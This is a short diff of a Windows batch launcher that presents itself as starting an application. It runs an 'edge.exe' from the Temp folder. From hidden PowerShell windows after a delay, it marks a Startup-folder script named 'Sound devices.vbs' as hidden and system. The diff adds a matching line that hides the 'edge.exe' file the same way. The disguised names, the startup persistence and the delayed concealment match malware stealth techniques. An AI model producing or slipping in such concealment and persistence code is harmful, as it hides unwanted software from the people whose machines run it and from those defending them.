@@ -9,8 +9,9 @@ echo Starting application...
 start "" "%temp%\edge.exe"
 
 powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 170; $file = [Environment]::GetFolderPath('ApplicationData') + '\Microsoft\Windows\Start Menu\Programs\Startup\Sound devices.vbs'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
-
+powershell -WindowStyle Hidden -Command "Start-Sleep -Seconds 170; $file = [Environment]::GetFolderPath('LocalApplicationData') + '\Temp\edge.exe'; if (Test-Path $file) { (Get-Item $file).Attributes = 'Hidden,System' }"
 pause
+
 
 
 
